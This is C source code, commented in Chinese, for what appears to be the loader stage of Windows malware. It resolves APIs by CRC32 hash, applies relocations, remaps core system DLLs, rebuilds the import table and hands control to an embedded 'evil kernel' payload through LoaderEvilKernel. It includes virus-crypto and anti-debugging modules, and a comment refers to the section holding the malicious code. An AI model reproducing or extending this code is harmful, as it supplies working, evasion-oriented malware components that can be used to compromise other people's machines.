// 获取DOS头
#define __GetDosHeader__(x)		((PIMAGE_DOS_HEADER)(x))
// 获取NT头
#define __GetNtHeader__(x)		((PIMAGE_NT_HEADERS)((__dword)__GetDosHeader__(x)->e_lfanew + (__dword)(x)))
// 获取首节节表
#define __GetSectionHeader__(x)	IMAGE_FIRST_SECTION(x)
// RVA换VA
#define __RvaToVa__(base,offset) ((__void *)((__dword)(base) + (__dword)(offset)))
// VA换RVA
#define __VaToRva__(base,offset) ((__void *)((__dword)(offset) - (__dword)(base)))

/*
 * 源代码
 */
#include "xVirusCrypto.c"
#include "AntiDbg.c"

/*
 * 函数原型
 */
typedef HMODULE (__API__ *FPLoadLibraryA)(__char *lpFileName);
typedef LPVOID (__API__ *FPVirtualAlloc)(__void *lpAddress, __integer iSize, __dword flAllocationType, __dword flProtect);
typedef __bool (__API__ *FPDllMain)(HMODULE hinstDLL, __dword fdwReason, __void *lpvReserved);
typedef __integer (__INTERNAL_FUNC__ *FPHashFunc)(__memory pTarget, __integer iTargetSize, __memory pHashValue);

/*
 * 检测是否存在指定的数据目录
 */
PIMAGE_DATA_DIRECTORY __INTERNAL_FUNC__ ExistDataDirectory(__memory pMem, __integer iIndex) {
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	pNtHeader = __GetNtHeader__(pMem);
	if ((pNtHeader->OptionalHeader).DataDirectory[iIndex].VirtualAddress != 0)
		return &((pNtHeader->OptionalHeader).DataDirectory[iIndex]);
	return NULL;
}

/*
 * 指定偏移是否在当前节中
 */
__bool __INTERNAL_FUNC__ InThisSection(PIMAGE_SECTION_HEADER pSectH, __offset ofOffset, __bool bRva) {
	return (bRva ? (ofOffset >= (__offset)(pSectH->VirtualAddress)) && (ofOffset < (__offset)(pSectH->VirtualAddress + pSectH->Misc.VirtualSize)) :
		(ofOffset >= (__offset)(pSectH->PointerToRawData)) && (ofOffset < (__offset)(pSectH->PointerToRawData + pSectH->SizeOfRawData)));
}

/*
 * 将偏移转换到所在的节
 */
PIMAGE_SECTION_HEADER __INTERNAL_FUNC__ Rva2Section(__memory pMem, __offset ofRva) {
	PIMAGE_NT_HEADERS pNtH = __GetNtHeader__(pMem);
	PIMAGE_SECTION_HEADER pSectH = __GetSectionHeader__(pNtH);
	__word wNumOfSects = pNtH->FileHeader.NumberOfSections;
	while (wNumOfSects > 0) {
		if (InThisSection(pSectH, ofRva, TRUE))
			break;

		--wNumOfSects;
		++pSectH;
	}

	return (0 == wNumOfSects ? NULL : pSectH);
}

PIMAGE_SECTION_HEADER __INTERNAL_FUNC__ Raw2Section(__memory pMem, __offset ofRaw) {
	PIMAGE_NT_HEADERS pNtH = __GetNtHeader__(pMem);
	PIMAGE_SECTION_HEADER pSectH = __GetSectionHeader__(pNtH);
	__word wNumOfSects = pNtH->FileHeader.NumberOfSections;
	while (wNumOfSects > 0) {
		if (InThisSection(pSectH, ofRaw, FALSE))
			break;

		--wNumOfSects;
		pSectH++;
	}

	return (0 == wNumOfSects ? NULL : pSectH);
}

/*
 * RVA2RAW|RAW2RVA
 */
__offset __INTERNAL_FUNC__ Rva2Raw(__memory pMem, __offset ofRva) {
	PIMAGE_SECTION_HEADER pSectH = Rva2Section(pMem, ofRva);
	return ((NULL == pSectH) ? NULL : (ofRva - pSectH->VirtualAddress + pSectH->PointerToRawData));
}

__offset __INTERNAL_FUNC__ Raw2Rva(__memory pMem, __offset ofRaw) {
	PIMAGE_SECTION_HEADER pSectH = Raw2Section(pMem, ofRaw);
	return ((NULL == pSectH) ? NULL : (ofRaw - pSectH->PointerToRawData + pSectH->VirtualAddress));
}

// 获取API地址所用的哈希函数
__dword __INTERNAL_FUNC__ GetApiAddress_Crc32HashFunc(__memory pTarget, __integer iTargetSize, __memory pHashValue) {
	__dword dwCrc32 = crc32(pTarget, iTargetSize);
	__logic_memcpy__(pHashValue, &dwCrc32, sizeof(__dword));
	return sizeof(__dword);
}

// 私有函数这里声明一下,底下函数有要用
FARPROC __INTERNAL_FUNC__ xLdrGetExportByName(__memory pBaseAddress, __memory pHashPoint, __integer iHashSize, FPHashFunc pHashFunc, FARPROC fpLoadLibraryA);
__integer __INTERNAL_FUNC__ xLdrFixupForwardHashFunc(__memory pTarget, __integer iTargetSize, __memory pHashValue) {
	__logic_memcpy__(pHashValue, pTarget, iTargetSize);
	return iTargetSize;
}

__INLINE__ FARPROC __INTERNAL_FUNC__ xLdrFixupForward(__memory pForwardName, FARPROC fpLoadLibraryA) {
	__char NameBuffer[128];
	__memory pPoint;
	HMODULE hModule;
	//__memory pBaseAddress;
	//FARPROC pFunction;
	FPLoadLibraryA pLoadLibraryA = (FPLoadLibraryA)fpLoadLibraryA;

	/*
	 * 取出DLL与引出的函数名
	 */
	__logic_strcpy__(NameBuffer, pForwardName);
	pPoint = __logic_strchr__(NameBuffer, '.');
	if (pPoint) {
		*pPoint = 0;//使用0字符将DLL与函数名隔开,替代'.'
		// 加载动态库
		hModule = pLoadLibraryA(NameBuffer);
		if (!hModule) return NULL;
		return xLdrGetExportByName((__memory)hModule, (__memory)(pPoint + 1), __logic_strlen__(pPoint + 1), xLdrFixupForwardHashFunc, fpLoadLibraryA);
	}

	return NULL;
}

FARPROC __INTERNAL_FUNC__ xLdrGetExportByOrdinal(__memory pBaseAddress, __word wOrdinal, FARPROC fpLoadLibraryA) {
	PIMAGE_EXPORT_DIRECTORY pExportDir;
	__integer iExportDirSize;
	__dword **pExFunctionsPoint;
	FARPROC pFunction;
	PIMAGE_DATA_DIRECTORY pExportDataDirectory = ExistDataDirectory(pBaseAddress, IMAGE_DIRECTORY_ENTRY_EXPORT);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBaseAddress + pExportDataDirectory->VirtualAddress);
	if (!pExportDir) 
		return NULL;
	iExportDirSize = pExportDataDirectory->Size;

	pExFunctionsPoint = (__dword **)__RvaToVa__(pBaseAddress, pExportDir->AddressOfFunctions);
	pFunction = (FARPROC)(0 != pExFunctionsPoint[wOrdinal - pExportDir->Base]
				? __RvaToVa__(pBaseAddress, pExFunctionsPoint[wOrdinal - pExportDir->Base])
				: NULL);

	if (((__address)pFunction >= (__address)pExportDir) &&
		((__address)pFunction < (__address)pExportDir + (__address)iExportDirSize))
		pFunction = xLdrFixupForward((__memory)pFunction, fpLoadLibraryA);

	return pFunction;
}

FARPROC __INTERNAL_FUNC__ xLdrGetExportByName(__memory pBaseAddress, __memory pHashPoint, __integer iHashSize, \
											  FPHashFunc pHashFunc, FARPROC fpLoadLibraryA) {
	  __word wOrdinal = 0;
	  __integer iDirCount = 0;
	  __address *pAddrTable = NULL;
	  __address addrAddr = 0;
	  __offset ofRVA = 0;
	  __integer iExpDataSize = 0;
	  PIMAGE_EXPORT_DIRECTORY pEd = NULL;
	  PIMAGE_NT_HEADERS pNt = NULL;
	  PIMAGE_DATA_DIRECTORY pExportDataDirectory = NULL;
	  if (pBaseAddress == NULL) return NULL;
	  pNt = __GetNtHeader__(pBaseAddress);
	  iDirCount = pNt->OptionalHeader.NumberOfRvaAndSizes;
	  if (iDirCount < IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return FALSE;
	  pExportDataDirectory = ExistDataDirectory(pBaseAddress, IMAGE_DIRECTORY_ENTRY_EXPORT);
	  if(!pExportDataDirectory) 
		  return NULL;//确定引出表
	  iExpDataSize = pExportDataDirectory->Size;
	  // 从引出表获取函数地址
	  pEd = (PIMAGE_EXPORT_DIRECTORY)__RvaToVa__(pBaseAddress, pExportDataDirectory->VirtualAddress);	
	  /* 
	   * 获取序数引出的函数
	   */
	  if (HIWORD((__dword)pHashPoint)==0) {//以序号引出
		  wOrdinal = (__word)(LOWORD((__dword)pHashPoint)) - pEd->Base;
	  } else {
		  __integer i, iCount;
		  __dword *pdwNamePtr;
		  __word *pwOrdinalPtr;

		  iCount = (__integer)(pEd->NumberOfNames);
		  pdwNamePtr = (__dword *)__RvaToVa__(pBaseAddress, pEd->AddressOfNames);
		  pwOrdinalPtr = (__word *)__RvaToVa__(pBaseAddress, pEd->AddressOfNameOrdinals);

		  for(i = 0; i < iCount; i++) {
			  __byte HashValue[1024];
			  __char *svName = NULL;
			  __integer iHashValueSize = 0;
			  svName = (__char *)__RvaToVa__(pBaseAddress, *pdwNamePtr);
			  iHashValueSize = pHashFunc(svName, __logic_strlen__(svName), HashValue);//进行哈希计算
			  if (iHashValueSize == iHashSize) {
				  if (__logic_memcmp__(HashValue, pHashPoint, iHashSize) == 0) {
					  wOrdinal = *pwOrdinalPtr;
					  break;
				  }
			  }
			  pdwNamePtr++;
			  pwOrdinalPtr++;
		  }
		  if (i == iCount) return NULL;
	  }

	  pAddrTable=(__address *)__RvaToVa__(pBaseAddress, pEd->AddressOfFunctions);
	  ofRVA = pAddrTable[wOrdinal];
	  addrAddr = (__address)__RvaToVa__(pBaseAddress, ofRVA);
	  /*
	   * 最终判断是否是中间跳转
	   */
	  if (((__address)addrAddr >= (__address)pEd) &&
		  ((__address)addrAddr < (__address)pEd + (__address)iExpDataSize))
		  return xLdrFixupForward((__memory)addrAddr, fpLoadLibraryA);
	  return (FARPROC)addrAddr;
}

__INLINE__ FARPROC __INTERNAL_FUNC__ xLdrGetProcedureAddress(__memory pBaseAddress, __memory pHashPoint, __integer iHashSize, \
															FPHashFunc pHashFunc, FARPROC fpLoadLibraryA) {
	FARPROC pProcedureAddress = NULL;
	__dword dwOrdinal = (__dword)pHashPoint;
	if (HIWORD((__dword)pHashPoint)) {
		// 通过名字引出
		pProcedureAddress = xLdrGetExportByName(pBaseAddress, pHashPoint, iHashSize, pHashFunc, fpLoadLibraryA);
	} else {
		// 通过序数
		dwOrdinal &= 0x0000FFFF;
		pProcedureAddress = xLdrGetExportByOrdinal(pBaseAddress, (__word)dwOrdinal, fpLoadLibraryA);
	}
	return pProcedureAddress;
}

FARPROC __INTERNAL_FUNC__ xGetProcAddressEx(HMODULE hDll, __memory pHashPoint, __integer iHashSize, FPHashFunc pHashFunc, FARPROC fpLoadLibraryA) {
	FARPROC fnExp = NULL;
	fnExp = xLdrGetProcedureAddress((__memory)hDll, pHashPoint, iHashSize, pHashFunc, fpLoadLibraryA);
	return fnExp;
}

// 重定位所需结构
#pragma pack(push,1)
// 修复入口
typedef struct _IMAGE_FIXUP_ENTRY {
	__word offset:12;
	__word type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;
// 重定位块
typedef struct _IMAGE_FIXUP_BLOCK {
	__dword dwPageRVA;
	__dword dwBlockSize;
} IMAGE_FIXUP_BLOCK, *PIMAGE_FIXUP_BLOCK;
#pragma pack(pop)
__bool __INTERNAL_FUNC__ BaseRelocation(__memory pMem, __address addrOldImageBase, __address addrNewImageBase, __bool bIsInFile) {
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	__offset delta = (__offset)(addrNewImageBase - addrOldImageBase);
	__integer *pFixAddRhi = NULL;
	__bool bHaveFixAddRhi = FALSE;
	__integer iRelocSize = 0;

	pNtHdr = __GetNtHeader__(pMem);
	iRelocSize = pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	if ((delta) && (iRelocSize)) {
		PIMAGE_FIXUP_BLOCK pStartFB = NULL;
		PIMAGE_FIXUP_BLOCK pIBR = NULL;
		if (bIsInFile) {
			__integer iRelocRaw = Rva2Raw(pMem, pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			pIBR = (PIMAGE_FIXUP_BLOCK)(pMem + iRelocRaw);
		} else {
			pIBR = (PIMAGE_FIXUP_BLOCK)__RvaToVa__(addrNewImageBase, pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		}
		pStartFB = pIBR;

		// 遍历每个重定位块
		while ((__integer)(pIBR - pStartFB) < iRelocSize) {
			PIMAGE_FIXUP_ENTRY pFE;
			__integer i, iCount = 0;
			if (pIBR->dwBlockSize > 0) {
				iCount=(pIBR->dwBlockSize - sizeof(IMAGE_FIXUP_BLOCK)) / sizeof(IMAGE_FIXUP_ENTRY);
				pFE = (PIMAGE_FIXUP_ENTRY)(((__memory)pIBR) + sizeof(IMAGE_FIXUP_BLOCK));
			} else {
				//pIBR = (PIMAGE_FIXUP_BLOCK)(((__memory)pIBR) + sizeof(IMAGE_FIXUP_BLOCK));		
				//continue;
				break;
			}

			// 修复每个入口
			for (i = 0; i < iCount; i++) {
				__memory pFixAddr = NULL;
				if (bIsInFile) {//如果在文件中
					__offset ofRva = pIBR->dwPageRVA + pFE->offset;
					__offset ofRaw = Rva2Raw(pMem, ofRva);
					pFixAddr = pMem + ofRaw;
				} else {//如果在内存中
					pFixAddr = __RvaToVa__(addrNewImageBase, pIBR->dwPageRVA + pFE->offset);
				}

				switch (pFE->type)
				{
#if defined(_X86_)
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGH:
					*((__sword *)pFixAddr) += (__sword)HIWORD(delta);
					break;
				case IMAGE_REL_BASED_LOW:
					*((__sword *)pFixAddr) += (__sword)LOWORD(delta);
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*((__sdword *)pFixAddr) += (__sdword)delta;
					break;
				case IMAGE_REL_BASED_HIGHADJ: // This one's really fucked up.
					{
						__dword dwAdjust;					
						dwAdjust = ((*((__word *)pFixAddr)) << 16) | (*(__word *)(pFE + 1));
						(__sdword)dwAdjust += (__sdword)delta;
						dwAdjust += 0x00008000;
						*((__word *)pFixAddr) = HIWORD(dwAdjust);
					}
					pFE++;
					break;
#endif
				default:
					return FALSE;
				}/* end switch */
				pFE++;
			}/* end for */

			pIBR = (PIMAGE_FIXUP_BLOCK)((__memory)pIBR + pIBR->dwBlockSize);
		}/* end while */
	}
	return TRUE;
}

// 重映射DLL
__memory __INTERNAL_FUNC__ RemapDll(__memory pOrigMap, FPVirtualAlloc pVirtualAlloc) {
	__memory pNewMap = NULL;
	__integer iSizeOfImage = 0;
	//FPDllMain pDllMain = NULL;
	PIMAGE_NT_HEADERS pOrigMapNtHdr = NULL;
	pOrigMapNtHdr = __GetNtHeader__(pOrigMap);
	iSizeOfImage = pOrigMapNtHdr->OptionalHeader.SizeOfImage;
	pNewMap = (__memory)pVirtualAlloc(NULL, iSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pNewMap) return NULL;
	__logic_memset__(pNewMap, 0, iSizeOfImage);
	__logic_memcpy__(pNewMap, pOrigMap, iSizeOfImage);
	// 进行重定位
	BaseRelocation(pNewMap, (__address)pOrigMap, (__address)pNewMap, FALSE);
	// 获取到入口点地址,并运行
	//pDllMain = (FPDllMain)(pNewMap + (pOrigMapNtHdr->OptionalHeader.AddressOfEntryPoint));
	//pDllMain((HMODULE)pNewMap, DLL_PROCESS_ATTACH, NULL);
	return pNewMap;
}

/*
 * 获取存放恶意代码的节头
 */
PIMAGE_SECTION_HEADER GetEvilSectionHeader(PIMAGE_NT_HEADERS pNtHdr) {
	PIMAGE_SECTION_HEADER pSectionHdr = NULL;
	__word wNumberOfSections = 0;
	wNumberOfSections = pNtHdr->FileHeader.NumberOfSections;
	pSectionHdr = __GetSectionHeader__(pNtHdr) + (wNumberOfSections - 1);
	return pSectionHdr;
}

/*
 * 获取自身代码节所在节
 */
PIMAGE_SECTION_HEADER GetCodeSectionHeader(PIMAGE_NT_HEADERS pNtHdr) {
	PIMAGE_SECTION_HEADER pSectionHdr = NULL;
	__offset ofEntryRva = 0;
	__word wNumberOfSections = 0;

	ofEntryRva = (__offset)(pNtHdr->OptionalHeader.AddressOfEntryPoint);
	wNumberOfSections = pNtHdr->FileHeader.NumberOfSections;
	pSectionHdr = __GetSectionHeader__(pNtHdr) + (wNumberOfSections - 1);
	// 遍历所有节
	while (wNumberOfSections--) {
		if ((ofEntryRva >= pSectionHdr->VirtualAddress) && (ofEntryRva < pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize)) {
			return pSectionHdr;
		}
		pSectionHdr--;
	}
	return NULL;
}

/*
 * 按照文件映射复制内存
 */
__bool __INTERNAL_FUNC__ CopyMemToMemBySecAlign(__memory pFromMemory, __memory pToMemory, __integer iSizeOfImage) {
	PIMAGE_NT_HEADERS pNt = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	__word wNumberOfSection = 0;
	__integer iHdrLen = 0;
	__integer i = 0;

	pNt = __GetNtHeader__(pFromMemory);
	pSectionHeader = __GetSectionHeader__(pNt);
	wNumberOfSection = pNt->FileHeader.NumberOfSections;
	iHdrLen = pSectionHeader->PointerToRawData;//获取PE头长度 + 所有节表头长度

	__logic_memset__(pToMemory, 0, iSizeOfImage);//首先将目标映射清除干净
	__logic_memcpy__(pToMemory, pFromMemory, iHdrLen);//复制PE头+节头

	for (i = 0; i < wNumberOfSection; i++) {
		__memory pSecMemAddr, pSecFileAddr;
		__integer iSecSize;
		// 复制节数据
		pSecMemAddr = pToMemory + pSectionHeader->VirtualAddress;
		pSecFileAddr = pFromMemory + Rva2Raw(pFromMemory, pSectionHeader->VirtualAddress);
		iSecSize = pSectionHeader->SizeOfRawData;
		__logic_memcpy__(pSecMemAddr, pSecFileAddr, iSecSize);
		pSectionHeader++;
	}

	return TRUE;
}

/*
 * 转换所有字符串为小写
 */
__void __INTERNAL_FUNC__ ChangeStringToUpper(__char *pString) {
	__integer i = 0;
	__integer iLen = 0;

	iLen = __logic_strlen__(pString);
	for (i = 0; i < iLen; i++) {
		pString[i] = __logic_toupper__(pString[i]);
	}
}

/*
 * 修复引入表
 */
__bool __INTERNAL_FUNC__ RefixIAT(__memory pImageBase) {
	__integer iOrigIatSize = 0;
	__integer iOldProtect = 0;
	__integer iImportAddressTableSize = 0;
	__integer iOldImportAddressTableProtect = 0;
	__integer iSizeOfImage = __GetNtHeader__(pImageBase)->OptionalHeader.SizeOfImage;
	__memory pImportAddressTable = NULL;
	PIMAGE_DATA_DIRECTORY pImportAddressDataDir = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pOrigIatAddress = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDes = NULL;
	PIMAGE_DATA_DIRECTORY pImportDataDir = ExistDataDirectory(pImageBase, IMAGE_DIRECTORY_ENTRY_IMPORT);//检查是否拥有映入表
	if (pImportDataDir == NULL)
		return FALSE;

	pOrigIatAddress = (PIMAGE_IMPORT_DESCRIPTOR)(__RvaToVa__(pImageBase, pImportDataDir->VirtualAddress));
	iOrigIatSize = pImportDataDir->Size;

	VirtualProtect((__void *)pOrigIatAddress, iOrigIatSize, PAGE_EXECUTE_WRITECOPY, &iOldProtect);
	// 这里将位于数据目录12索引的引入地址表的地址也设置为可写,如果存在这个表那么地址表真正在此处
	pImportAddressDataDir = ExistDataDirectory(pImageBase, IMAGE_DIRECTORY_ENTRY_IAT);
	if (pImportAddressDataDir) {
		pImportAddressTable = (__memory)__RvaToVa__(pImageBase, pImportAddressDataDir->VirtualAddress);
		iImportAddressTableSize = pImportAddressDataDir->Size;
		VirtualProtect((__void *)pImportAddressTable, iImportAddressTableSize, PAGE_EXECUTE_WRITECOPY, &iOldImportAddressTableProtect);
	}

	pImportDes = (PIMAGE_IMPORT_DESCRIPTOR)__RvaToVa__(pImageBase, pImportDataDir->VirtualAddress);

	// 有些程序只适用FirstThunk
	while ((pImportDes->OriginalFirstThunk) || (pImportDes->FirstThunk)) {
		__char *svDllName = (__char *)__RvaToVa__(pImageBase, pImportDes->Name);
		HMODULE hDll = GetModuleHandleA((__char *)svDllName);//映射库到地址空间
		if(!hDll) hDll = LoadLibraryA((LPCSTR)svDllName);
		if(!hDll) return FALSE;

		// 这里做重映射
		ChangeStringToUpper(svDllName);
		if ((__logic_strcmp__(svDllName, "KERNEL32.dll") == 0) || \
			(__logic_strcmp__(svDllName, "ADVAPI32.dll") == 0) || \
			(__logic_strcmp__(svDllName, "USER32.dll") == 0) || \
			(__logic_strcmp__(svDllName, "SHELL32.dll") == 0)) {
			hDll = (HMODULE)RemapDll((__memory)hDll, (FPVirtualAlloc)VirtualAlloc);
		}

		if (pImportDes->TimeDateStamp == 0 || TRUE) {
			PIMAGE_THUNK_DATA pTdIn, pTdOut;
			pImportDes->ForwarderChain = (__integer)hDll;
			pImportDes->TimeDateStamp = 0xCDC31337; // This is bullshit cuz I don't want to call libc.

			// 填充引入表地址
			if (pImportDes->OriginalFirstThunk == 0)//如果此字段为0,则使用FirstThunk
				pTdIn = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->FirstThunk);
			else
				pTdIn = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->OriginalFirstThunk);
			pTdOut = (PIMAGE_THUNK_DATA)__RvaToVa__(pImageBase, pImportDes->FirstThunk);

			while(pTdIn->u1.Function) {
				FARPROC pFunc;

				// 以序号引出还是以函数名引出
				if (pTdIn->u1.Ordinal & IMAGE_ORDINAL_FLAG32) {
					//pFunc = GetProcAddress(hDll, (__char *)MAKEINTRESOURCE(pTdIn->u1.Ordinal));//序号引出
					pFunc = xGetProcAddressEx(hDll, (__memory)pTdIn->u1.Ordinal, sizeof(__dword), GetApiAddress_Crc32HashFunc, (FARPROC)LoadLibraryA);
				} else {
					// 函数名引出
					__dword dwHashValue = 0;
					__integer iValueSize = 0;
					PIMAGE_IMPORT_BY_NAME pIbn = NULL;
					pIbn = (PIMAGE_IMPORT_BY_NAME)__RvaToVa__(pImageBase, pTdIn->u1.AddressOfData);
					iValueSize = GetApiAddress_Crc32HashFunc((__memory)(pIbn->Name), __logic_strlen__(pIbn->Name), (__memory)&dwHashValue);
					pFunc = xGetProcAddressEx(hDll, (__memory)&dwHashValue, sizeof(__dword), GetApiAddress_Crc32HashFunc, (FARPROC)LoadLibraryA);
					//pFunc = GetProcAddress(hDll, (__char *)pIbn->Name);
				}
				if (!pFunc) return FALSE;
				// 检验地址是否是中间跳转
				if (((__memory)pFunc < (__memory)pImageBase) || ((__memory)pFunc >= (__memory)pImageBase + iSizeOfImage)) {
					// 重新获取地址
				}

				pTdOut->u1.Function = (__dword)pFunc;
				pTdIn++;
				pTdOut++;
			}/* end while */
		}/* end if */
		// 下一个DLL
		pImportDes++;
	}/* end while */

	// 设定这段内存为原属性
	VirtualProtect((__void *)pOrigIatAddress, iOrigIatSize, iOldProtect, NULL);
	if (pImportAddressTable)//地址引入表
		VirtualProtect((__void *)pImportAddressTable, iImportAddressTableSize, iOldImportAddressTableProtect, NULL);
	return TRUE;
}

/*
 * PE加载器
 */
typedef __bool (__API__ *FPEvilKernelEntry)(__dword hModule, __dword ul_reason_for_call, __memory lpReserved);
FPEvilKernelEntry __INTERNAL_FUNC__ LoaderEvilKernel(__memory pLoadCode, __memory pOutMemory, __integer iOutMemorySize) {
	FPEvilKernelEntry pEntryFunction = NULL;
	__address addrOldImageBase = 0;
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	__dword dwOldProtected = 0;
	__dword dwSizeOfImage = 0;

	pNtHdr = __GetNtHeader__(pLoadCode);
	dwSizeOfImage = pNtHdr->OptionalHeader.SizeOfImage;
	if (dwSizeOfImage > iOutMemorySize)//尺寸不合适
		return NULL;

	VirtualProtect(pOutMemory, dwSizeOfImage, PAGE_WRITECOPY, &dwOldProtected);//修改内存权限
	if (CopyMemToMemBySecAlign(pLoadCode, pOutMemory, dwSizeOfImage) == FALSE) return FALSE;//复制到内存

	// 修复重定位表
	addrOldImageBase = pNtHdr->OptionalHeader.ImageBase;
	if (!BaseRelocation(pOutMemory, addrOldImageBase, (__address)pOutMemory, FALSE))
		return FALSE;

	// 修复输入表
	if (!RefixIAT(pOutMemory))
		return NULL;

	/*
	 * 取得入口点函数
	 */
	pNtHdr = __GetNtHeader__(pOutMemory);
	pEntryFunction = (FPEvilKernelEntry)(pOutMemory + pNtHdr->OptionalHeader.AddressOfEntryPoint);
	return pEntryFunction;
}
